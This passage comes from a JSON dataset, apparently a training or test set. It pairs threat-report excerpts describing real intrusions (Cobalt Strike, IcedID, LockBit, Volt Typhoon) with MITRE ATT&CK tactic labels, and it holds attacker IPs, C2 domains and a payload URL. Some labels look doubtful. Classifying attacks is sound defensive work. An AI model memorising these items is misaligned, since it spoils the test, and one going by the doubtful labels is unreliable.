        "input": "Described attack activity: The Trojan is able to use two mechanisms to communicate with its C2 server: HTTP requests and DNS tunneling. The DNS tunneling protocol found in this payload is remarkably similar to recent ISMDoor samples, as documented inArbor Networks' research. Similar message handling is found in both ISMAgent and ISMDoor, in addition to the existence of strings in both samples, such the hardcoded IPv6 values. The similarities may allow for backward compatibility between ISMAgent and ISMDoor C2 infrastructure. In the payloads themselves, a number of differences exist, enough that in essence they appear to be different tools.\nRegardless of the communications method used, the Trojan will parse the received data from the C2 server for a GUID field that the Trojan will use as a unique identifier, as well as commands the Trojan should run on the compromised system:",
        "output": "command and control",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 42 researchers recently discovered two separate campaigns targeting job-seeking activities linked to state-sponsored threat actors associated with the Democratic People's Republic of Korea (DPRK), commonly known as North Korea. We call the first campaign \"Contagious Interview,\" where threat actors pose as employers (often anonymously or with vague identities) to lure software developers into installing malware through the interview process. This malware creates the potential for various types of theft. We attribute with moderate confidence that Contagious Interview is run by a North Korea state-sponsored threat actor.\nWe call the second campaign \"Wagemole,\" where threat actors seek unauthorized employment with organizations based in the US and other parts of the world, with potential for both financial gain and espionage. We attribute with high confidence that Wagemole is a North Korea state-sponsored threat. Activity from both campaigns remains an ongoing active threat.\nWe nicknamed the first campaign Contagious Interview because the threat actor attempts to infect software developers with malware through a fictitious job interview. We originally discovered Contagious Interview through customer telemetry, and our research indicates it started as early as December 2022. Some of the infrastructure supporting this campaign remains active, and this activity remains a consistent threat. The first campaign's objective is likely cryptocurrency theft and using compromised targets as a staging environment for additional attacks. We track Contagious Interview as CL-STA-0240.\nWhile pivoting on indicators from Contagious Interview, we discovered exposed files on a different threat actor-controlled infrastructure. These files indicate fraudulent job-seeking activity targeting a wide variety of United States (US) companies. This trove of information includes resumes with different technical skill sets and multiple identities impersonating individuals from various nations. It also includes common job interview questions and answers, scripts for interviews and downloaded job postings from US companies. We call this separate campaign \"Wagemole\" and track it as CL-STA-0241.\nWhile we cannot determine the objective of this campaign, the US Department of Justice and Federal Bureau of Investigation (FBI) have reported that North Koreauses remote workers to funnel wages to its weapons programs.\nDuring our investigation of Contagious Interview, we discovered two new families of malware we named BeaverTail and InvisibleFerret. BeaverTail is JavaScript-based malware hidden inside Node Package Manager (NPM) packages. InvisibleFerret is a simple but powerful Python-based backdoor. Both are cross-platform malware that can run on Windows, Linux and macOS.\nThis article provides an overview of these two campaigns, and we examine the two new malware families, BeaverTail and InvisibleFerret.\nThis article also provides insight on how these threat actors are both seeking jobs and targeting job seekers to accomplish their goals. We provide recommendations for both job applicants and employers to consider when interviewing or applying for remote jobs.\nFor example:\nDon't use company-issued computers for personal activities. \nBe wary of GitHub accounts with few repositories or updates. \nConfirm the legitimacy of companies you're applying for. \nThoroughly vet the identity of job applicants.\nPalo Alto Networks customers receive protection from the malware discussed in this article through ourNext-Generation FirewallwithCloud-Delivered Security Services, includingAdvanced WildFire,DNS SecurityandAdvanced URL Filtering.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: WebLogicScan\nThe threat actor useWebLogicScan, a python script that scans for vulnerabilities in WebLogic.\nBased on bash history, they ran the tool by supplying various text files to the script.\nVulmap\nThe threat actor usedvulmap.pyto also scan for WebLogic vulnerabilities by providing several lists of their targets.\nBash history excerpts:\nBelow is the help options detailing the \"-a\" switch that defines what application is being targeted.\nXray\nThe threat actor scanned for vulnerabilities more broadly with the toolXrayfor vulnerabilities against two Chinese websites.\nBash history excerpts:\ndirsearch\nThe threat actor useddirsearchto attempt to scan for URL paths against their targets. A log of one of their scans still remained:",
        "output": "other",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ExecutesJuicyPotato,RottenPotatoand SweetPotato, attempting toelevatetheprivileges. ",
        "output": "privilege escalation",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1595.001 Active Scanning  Scanning IP Blocks\nUsinghttpxthe threat actor conducted large scale scanning across ASNs. The tool httpx aims to identify web services exposed to the internet and fingerprint what is running behind it.\nThe arguments-status-codeand-tech-detectdisplay the HTTP status code and technology in use (based on the wappalyzer dataset). One of the saved httpx outputs can be seen below:\nT1595.002 Active Scanning  Vulnerability Scanning\nThe threat actor usednucleito conduct scanning and software identification. We were able to see this activity from the bash history file:\nBelow was a sample of the captured outputs of the nuclei scans identifying critical vulnerabilities:\nT1595.003 Active Scanning  Wordlist Scanning\nUsingsubfinder, the threat actor identified the subdomains of their targets before scanning further:\nThe outputs were saved on the host:\nT1596 Search Open Technical Databases\nThe threat actor used the OWASP toolamassto conduct reconnaissance on their targets using open-source databases and APIs:\nWe discovered a shodan API key used by the threat actor under configuration files in the open directory:\nFrom the bash history, we can see the threat actor using shodan to search for CVE-2022-42475:\nIt is noted that this Shodan key was leaked on Telegram at least as far back as early December of 2022, as well as several other places including Linkedin and Cracked[.]io since then.",
        "output": "other",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In this case, there was no further impact to the environment before the threat actors were evicted.Due to our previous report and OSINT research we believewith medium to high confidence that this intrusion would have ended in ransomware.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While the ransom note indicated the threat actor stole data, we did not observe any overt exfiltration of data; however, it is possible that the threat actors used IcedID or Cobalt Strike to transmit sensitive data.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: For lateral movement, Volt Typhoon actors have been observed predominantly employing RDP with compromised valid administrator credentials. Note: With a full on-premises Microsoft Active Directory identity compromise (see the Credential Access section), the group may be capable of using other methods such as Pass the Hash or Pass the Ticket for lateral movement [T1550]. \nIn one confirmed compromise of a Water and Wastewater Systems Sector entity, after obtaining initial access, Volt Typhoon actors connected to the network via a VPN with administrator credentials they obtained and opened an RDP session with the same credentials to move laterally. Over a nine-month period, they moved laterally to a file server, a domain controller, an Oracle Management Server (OMS), and a VMware vCenter server. The actors obtained domain credentials from the domain controller and performed discovery, collection, and exfiltration on the file server (see the Discovery and Collection and Exfiltration sections). \nVolt Typhoon's movement to the vCenter server was likely strategic for pre-positioning to OT assets. The vCenter server was adjacent to OT assets, and Volt Typhoon actors were observed interacting with the PuTTY application on the server by enumerating existing stored sessions. With this \ninformation, Volt Typhoon potentially had access to a range of critical PuTTY profiles, including those for water treatment plants, water wells, an electrical substation, OT systems, and network security devices. This would enable them to access these critical systems [T1563]. See Figure 2. \nAdditionally, Volt Typhoon actors have been observed using PSExec to execute remote processes, including the automated acceptance of the end-user license agreement (EULA) through an administrative account, signified by the accepteula command flag. \nVolt Typhoon actors may have attempted to move laterally to a cloud environment in one victim's network but direct attribution to the Volt Typhoon group was inconclusive. During the period of the their known network presence, there were anomalous login attempts to an Azure tenant [T1021.007] potentially using credentials [T1078.004] previously compromised from theft of NTDS.dit. These attempts, coupled with misconfigured virtual machines with open RDP ports, suggested a potential for cloud-based lateral movement. However, subsequent investigations, including password changes and multifactor authentication (MFA) implementations, revealed authentication failures from nonassociated IP addresses, with no definitive link to Volt Typhoon. ",
        "output": "lateral movement",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 42 researchers observed Royal threat actors using the network discovery software NetScan to identify and map out various connected computer resources such as other user targets and shares. In addition to using NetScan, we also observed them using PsExec for conducting lateral movement within the infected environments.",
        "output": "lateral movement",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After creating a RAR archive as noted in theCollectionsection, the threat actor moved to exfiltrate this data. Using Edge, they went to mystuff.bublup.com.Bublupis a SASS project management suite that includes cloud based storage.\nBublup uses amazon S3 as their back-end for storage.\nThe threat actor then proceeded to upload the rar archives to the cloud storage service.\nIn total, 934.38 MB was transferred to the cloud storage service",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The BazarLoader malware on the beachhead began discovery actions around 20 minutes after the initial execution. The discovery commands utilize the familiar built in Microsoft utilities.\nThe Cobalt Strike beacon ran additional discovery tasks on the beachhead. Again built in Microsoft utilities were utilized.\nThroughout the intrusion the threat actor checked the time of systems with:\nFrom an svchost process injected with a Cobalt Strike beacon, SMB scanning was performed across the environment.\nFrom the domain controller the threat actor ran an encoded PowerShell command to review the size and condition of hard drives across the environment.\nDecoded:\nPowersploit modules like Get-NetComputer were seen used by the threat actor from the domain controller\nThe script Get-DataInfo.ps1, which has been used inmany intrusions this past year, was also employed. This file was started by the use of start.bat, which has been seen paired with this script repeatedly.\nThe contents of Get-DataInfo.ps1 provide the threat actor with very specific details of the environment. This includes things like disk size, connectivity, antivirus software, and backup software.\nThis script was first reported used by threat actors deploying the Ryuk ransomware strain.\nThe Microsoft Active Directory PowerShell module was also imported and used for discovery tasks.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Current builds of Ryuk no longer contain persistence functionality. Previously, to remain persistent on the host, Ryuk created a registry entry under the Run key using Windows cmd.exe shell. The following command line was used to write to the Registry Run Key name svchos to \nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\Curren tVersion\\Run with the value being the path to the Ryuk executable. ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1016.001: Internet Connection Discovery T1046: Network Service Scanning T1497.003: Time Based Evasion T1526: Cloud Service Discovery ",
        "output": "discovery",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the eleventh day, the threat actor began a ransomware deployment. This final stage included the preparatory steps to deploy across the network. The process started with the execution of a batch script named SETUP.bat, which created a staging file share:\nSeveral files, including the LockBit ransomware encryptor, ds.exe, PSExec, and other helper batch scripts, were uploaded to this shared directory to facilitate the ransomware deployment. These scripts included redundancy for sharing the ransomware binary and executing it.\nNext, a script named WMI.bat utilized WMI to copy the ransomware payload from the shared directory (SHARE$) to local machines and execute it. Notably, the threat actor did not limit their targeting to specific hosts but aimed at all accessible hosts within identified subnets. The payload execution command was as follows:\nWMI commands further facilitated payload distribution, leveraging bitsadmin to transfer and execute the ransomware on remote hosts. These commands triggered parent-child process chains, such as wmiprvse.exe spawning from bitsadmin commands:\nAdditionally, the threat actor employed a batch script named COPY.bat to use PSExec for copying the payload from the shared directory to target machines. Evidence of PSExec executions were identifiable by Service Creation events (Event ID 7045) and execution of PSEXESVC.exe. The relevant commands were:\nSource Host executingcopy.batand, by extensionPsExec.exe:\n1. Source Host Execution\nDestination Host executing the command to copy the LockBit encryptor to the local machine:\n2. Service Execution (Destination Host)\nThe threat actor executed the LockBit encryptor using a batch file named EXE1.bat, which leveraged PSExec to run the ransomware binary, ds.exe, on the hosts, copying it into their Windows temporary folders.\nLockBit Execution from Source host via PSExec:\nThe threat actor also utilized a modified version of WMI1.bat to distribute and execute the payload via WMI commands, targeting hosts listed in an input file. This phase exhibited similar process behavior as earlier, with wmiprvse.exe spawning the transfer tasks:\nLockBit Execution from Source host via WMIC:\nSimilar to the previous WMI execution, on the remote host, wmiprvse.exe will be responsible for spawning the Bitsadmin transfer job.\nLockBit Execution on Destination host via WMIC:\nThe entire deployment activity took approximately two hours. Despite several errors during execution, the threat actor successfully deployed the LockBit ransomware. Encrypted hosts displayed a modified desktop background, redirecting users to the ransom note.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The Emotet loader pulled the main second stage payload from the following domains:\nThe second stage loader had multiple IP addresses in its configuration to attempt connections to:\nThe following Cobalt Strike C2 servers were observed being used. Both HTTP and HTTPS were observed to be used.\nThe following are the Cobalt Strike configurations observed:\nThe threat actor dropped a Tactical RMM Agent on one of the servers as an alternative command and control avenue to access the network. During the installation of the software, the following command was observed:\nThis command reveals thefloppasoftware.comdomain used by the threat actor for the remote management of Tactical RMM Agent. This domain was registered very close to the timeline of this incident.\nA domain registered to be used with Tactical RMM Agent will have both anapiandmeshsubdomain, in this caseapi.floppasoftware[.]comandmesh.floppasoftware[.]com. These were both hosted on the same server IP: 212.73.150.62.\nIn addition, during the execution of Tactical RMM Agent, the software will reach out to a centralized domain in order to retrieve the current public IP address in use:\nAnyDesk\nOn the final day of the intrusion, AnyDesk was deployed on the server they had previously installed Tactical RMM on. Using this RMM agent they proceeded to install AnyDesk on the host. The following process activity was observed from meshagent.exe.\nThe decoded base 64 content reveals commands for console access and connect actions.\nThis is then followed by the following process flow:\nOnce downloaded and installed, the threat actor initiated a connection to the AnyDesk host.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: RDP was used by the threat actors to move laterally from the beachhead to other servers in the environment. After connecting to each server with RDP, the threat actors took steps to deploy a Cobalt Strike beacon, as well as AnyDesk on the system.\nThe Cobalt Strike payload was downloaded from91.215.85[.]183/download/csrss.exevia Internet Explorer.\nThe payload was then launched multiple times from the Downloads folder and also copied and executed from the Windows temporary folder.\nIn addition, theINSTALL.ps1script was dropped and executed by the Cobalt Strike beacon.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The renamed ScreenConnect installer was copied from the beachhead to domain controllers, a backup server, and a file server using SMB. As explained in theexecution section, the installer was also executed via Impacket's wmiexec.py script, which resulted in the ScreenConnect installation. Multiple commands were executed on the compromised hosts via ScreenConnect command functionality.\nEvent ID 5145 logs:\nRDP was used extensively during the intrusion by the threat actor to move laterally.\nWhile the threat actor most frequently used the native Windows RDP clients, on at least one occasion they proxied their RDP session via the CSharp Streamer.\nWhen doing this, they left a trace of their remote host name logged under Event ID 4778:",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Add persistence capabilities to a PowerShell script \nNew-UserPersistenceOption \nConfigure user-level persistence options for the Add-Persistence function. ",
        "output": "persistence",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: TheIcedID DLLthat we executed was most likely dropped through a zip file, which included a JavaScript file within it.Bradhad a few posts about these around the time of this intrusion.12Thanks Brad!\nVarious attributes including the computer name and the OS version of the compromised system were sent through encoded cookie values.\nIcedID was executed via rundll32.exe and ran command and control over port 443 for the duration of the intrusion.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Rita stands for Real Intelligence Threat Analytics (RITA), developed by Active Countermeasures. Rita is a framework for identifying command and control communication, also known as beaconing. As the name implies, beaconing refers to delivering regular messages from an infected host to an attacker-controlled host. Beacon is the malware agent installed on the victim's device and is responsible for communicating with the C2 server. Rita is consuming zeek/bro logs and detecting suspected beaconing activity using network traffic calculations.\nIt then assigns a value ranging from 0.1 to 1.0, with the greater the score indicating that the network activity is suspicious. Rita is utilized as a hunting tool rather than a real-time detection tool, though simple scripting allows Rita to be used for live traffic analysis. However, analysts should add additional context and filter the results accordingly. Rita can only identify suspicious communication and should not be automated as a preventative control. For more info on how RITA works check out themathamatics here.\nUsing with this case network traffic RITA was able to identify all active Beacons from the impacted hosts in the network as seen in the screenshot below:\nIcedID:\nCobalt Strike C2 configuration:\nkaslose.com (146.70.24.186)  This Cobalt Strike server was added to ourThreat Feedon 07/19/2021.\nThe following Cobalt Strike server was added to ourThreat Feedon 07/26/2021.\nHTTP User Agent:\nBased on theSubject Common name (cdnwin.xyz)we can see that there are 5 Cobalt Strike servers associated with this group all hosted on HostHatch, and registered by NameCheap. Still online as of 10/10/2021\ncroperdate.com (146.70.24.133:443)- This Cobalt Strike server was added to ourThreat Feedon 07/27/2021.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The ISO file contained a LNK file, with an icon of an Image, which prompted the user to click on it.When the user opened the LNK file, the batch script demurest.cmd was executed.\nThe batch script in the demurest.cmd file did the following:\nOpened pimpliest_kufic.png, which displayed an image. \nThe Windows utility xcopy was used to copy rundll32.exe to %temp%\\entails.exe. \nCreated string \"templates544.png\" on the runtime and copied it with a random number with a format: RANDOM_NUM.RANDOM_NUM. \ntemplates544.png was an IcedID DLL and was executed via entails.exe.\nWe can see from memory (MemProcFS), cmd executes entails.exe, which executes the IcedID dll by looking at the CommandLine. We can also see the call chain of cmd->entails.exe with a grand parent process of explorer.exe\nAround six hours into the intrusion, 1.dll (Cobalt Strike) was dropped on the beachhead host before being copied to a domain controller. After 1.dll was transferred to the domain controller, it was executed via rundll32.exe via following command:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1035 Service Execution | Service registered to run CMD (as ComSpec) and PowerShell commands \nLateral movement \nT1076 Remote Desktop Protocol | Use of RDP to reach other machines in the network T1105 Remote File Copy | Lateral movement using WMI and PsExec ",
        "output": "execution",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While updating the SolarWinds application, the embedded backdoor code loads before the legitimate code executes. Organizations are misled into believing that no malicious activity has occurred and that the program or application dependent on the libraries is behaving as expected. \nThe attackers have compromised signed libraries that used the target companies' own digital certificates, attempting to evade application contr technologies. Microsoft already removed these certificates from its trusted list. The certificate details with the signer hash are shown below: \nThe DLL then loads from the installation folder of the SolarWinds application. Afterwards, the main implant installs as a Windows service and as a DL file in the following path using afolder with different names: \nSolarWinds Orion installation folder, for example, %PROGRAMFILES%\\SolarWinds\\Orion\\SolarWinds.Orion.Core.BusinessLayer.dl The .NET Assembly cache folder (when compiled) %WINDIR%\\System32\\config\\systemprofile\\AppData\\Local\\assembly\\tmp\\ <VARIES>\\SolarWinds.Orion.Core.BusinessLayer.dll \nMicrosoft security researchers observed malicious code from the attacker activated only when running under SolarWinds.BusinessLayerHost.exe process context for the DLL samples currently analyzed. ",
        "output": "execution",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: UNC2529 displayed indications of target research based on their selection of sender email addresses and subject lines which were tailored to their intended victims. For example, UNC2529 used a unique username, masquerading as an account executive for a small California-based electronics manufacturing company, which Mandiant identified through a simple Internet search. The username of the email address was associated with both sender domains, tigertigerbeads<.>com and the compromised HVAC company. Masquerading as the account executive, seven phishing emails were observed targeting the medical industry, high-tech electronics, automotive and military equipment manufacturers, and a cleared defense contractor with subject lines very specific to the products of the California-based electronics manufacturing company. \nAnother example is a freight / transport company that received a phish with subject, \"compton ca to flowery branch ga\", while a firm that recruits and places long-haul truck drivers received a simple, \"driver\" in the subject line. \nA utility company received a phish with subject, \"easement to bore to our stairwell area.\" \nWhile not all financial institutions saw seemingly tailored subjects, numerous appeared fairly unique, as shown in Table 1. \nThe UNC2529 Triple Double: A Trifecta Phishing Campaign | Mandiant | Google Cloud Blog Several insurance companies that were targeted saw less specific subjects, but still appropriate for the industry, such as those in Table 2. \nInterestingly, one insurance company with offices in eastern Texas received a phish with a subject related to a local water authority and an ongoing water project. While no public information was found to tie the company to the other organization or project, the subject appeared to be very customized. \nSome patterns were observed, as seen in Table 3. Additionally, UNC2529 targeted the same IT services organization in both waves using the same lure (1 \nThe UNC2529 Triple Double: A Trifecta Phishing Campaign | Mandiant | Google and 5 in Table 3). Most of the phishing emails with lures containing \"worker\" targeted U.S. organizations. As \"worker\" isn't a common way to refer to an employee in the U.S., this may indicate a non-native American English speaker. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Ran on the beachhead.\nRan on a domain controller.\nThen they imported the PowerShell Active Directory module.\nThey then ran the following looking for host names, operating systems and last logon dates of all AD systems.\nAfter already completing the above discovery work and having already pivoted to their 2nd domain controller, the threat actors moved on to AdFind for further domain reconnaissance.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor initially ran hostname, followed by the following commands over a 30-minute time span. Notably, there was a considerable time difference between some of these commands:\nAfter this, the threat actor decided to drop a new access capability, a Cobalt Strike beacon. This beacon continued with a follow-up recon command:\nShortly after getting access to one of the domain controllers in the environment, the threat actor executed the following commands in quick succession:\nAlmost simultaneously, the threat actor moved to a backup server in the environment, performing the same remove service execution and deploying Cobalt Strike. Quickly after is the execution of the command for collection of the installed AV/EDR products via the WMIC.\nWhile WMIC is deprecated since W10 21H1, it is still regularly used for multiple administrative tasks or by threat actors.\nMoving onto multiple machines in the environment, dropping Cobalt Strike Beacons, the actor performed the following Discovery commands:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1027: Obfuscated Files or Information T1027.005: Indicator Removal from Tools T1036: Masquerading \nT1036.003: Rename System Utilities   \nT1055: Process Injection   \nT1070.004: File Deletion   \nT1140: Deobfuscate/Decode Files or Information   \nT1218.010: Regsvr32   \nT1218.011: Rundll32   \nT1497.001: System Checks   \nT1553.002: Code Signing   \nT1564.003: Hidden Window   \nT1620: Reflective Code Loading ",
        "output": "defense evasion",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Domain discovery (AdFind and Rubeus outputs) exfiltrated by vsftpd to 45.141.84[.]120.",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After creating a local administrator account by exploiting CVE-2023-27532, the threat actor moved to a Veeam backup server via Remote Desktop Protocol. Next, they pivoted again from the backup server to a second server in the environment using RDP.\nAs they were proxying their requests through their existing malware, their workstation name was leaked in the authentication event to reveal they were likely using Kali OS.\nOnce on the backup server the threat actor ran Cobalt Strike on the host using rundll32.exe.\nThis beacon had the same C2 details as the one used on the beachhead host.\nAn additional threat actor workstation name, PACKERP-VUDV41R, was leaked in the authentication logs from the backup server.\nOf note, both the host names kali and PACKERP-VUDV41R wereobserved in the Arctic Fox article regarding a FOG ransomware case, along with several tools mentioned in this report.\nRemote Service Creation\nAfter exploiting Veeam and gaining access to the backup server the threat actor obtained credentials for a domain administrator account. using this account they created a remote service on a management server and created a sqlbackup user with the same properties as the one they created on the backup server.\nThis activity could be observed over the network with suricata rules:\nAnd locally on the remote management server, 7045 events were created followed by process events to create the user account locally on the host.\nAfter performing these actions the threat actor again used RDP to access this host.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We analyzed the sample with the SHA-256 hash of 8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330, also known as Wintapix.sys. As the file extension suggests, this is a Windows Kernel Driver. Figure 1 shows some of its attributes.\nIts digital signature is invalid, meaning the threat actor might first need to load a vulnerable (but legitimate) driver and exploit that to load the Wintapix.sys. But once the driver is loaded, the following execution chain runs:\nWintapix.sys is loaded in the kernel. \nWintapix.sys injects an embedded shellcode into a suitable process local system privilege. \nThe injected shellcode loads and executes an encrypted .NET payload.\nWe will look at these artifacts in more detail in the rest of the analysis.",
        "output": "other",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors created two local user accounts on the first Domain Controller. They also added one of the two to the local administrators group. The passwords that they used were the same as the passwords of the recent Conti leaked documents.\nScreenshot from leaked Conti data (\"\u0417\u0430\u043a\u0440\u0435\u043f\\ AnyDesk.txt\") (our tweet thread on Conti leak manuals):\nCommands from the intrusion:\nAnyDesk was also installed on the main domain controller.\nThe threat actors maintained an open communication channel through AnyDesk for a period of 11 hours.\nThe threat actor was seen logging in from 185.220.100.242 (Tor Exit Node) using AnyDesk. Client ID 776934005. (ad_svc.trace)",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The data exfiltration process runs in the following sequence: The temp.ini files are copied into a text file that matches the pattern: \nFrom <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt. For example, From <COMPUTER-NAME> (01-04 11-40-02).txt \nAll the text files are now packed into the archive temp.zip (%temp%\\temp.zip) zip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt   \ntxt is uploaded to the control server ",
        "output": "exfiltration",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1485 Data Destruction   \nT1486 Data Encrypted for Impact   \nT1489 Service Stop   \nT1490 Inhibit System Recovery   \nT1491 Defacement T1491.001 Internal Defacement T1491.002 External Defacement   \nT1529 System Shutdown/Reboot   \nT1531 Account Access Removal   \nT1657 Financial Theft \nPosted in Threat Intelligence ",
        "output": "impact",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon successful installation of the webshell, the operators run multiple commands to gain situational awareness from the exploited system. This includes testing network connectivity by pinging Google.com, listing current folders, identifying the current user privileges, enumerating local system users, and listing websites hosted by the compromised server. The operators also attempt to assess if the web server is joined and/or trusted by any domain. At a later stage, this will prove useful as it will inform them on the next course of actions for dumping local or domain credentials. ",
        "output": "discovery",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Early observed attacks by DEV-0537 targeted cryptocurrency accounts resulting in compromise and theft of wallets and funds. As they expanded their attacks, the actors began targeting telecommunication, higher education, and government organizations in South America. More recent campaigns have expanded to include organizations globally spanning a variety of sectors. Based on observed activity, this group understands the interconnected nature of identities and trust relationships in modern technology ecosystems and targets telecommunications, technology, IT services and support companiesto leverage their access from one organization to access the partner or supplier organizations. They have also been observed targeting government entities, manufacturing, higher education, energy, retailers, and healthcare. \nMicrosoft will continue to monitor DEV-0537 activity and implement protections for our customers. The current detections and advanced detections in place across our security products are detailed in the following sections. ",
        "output": "impact",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
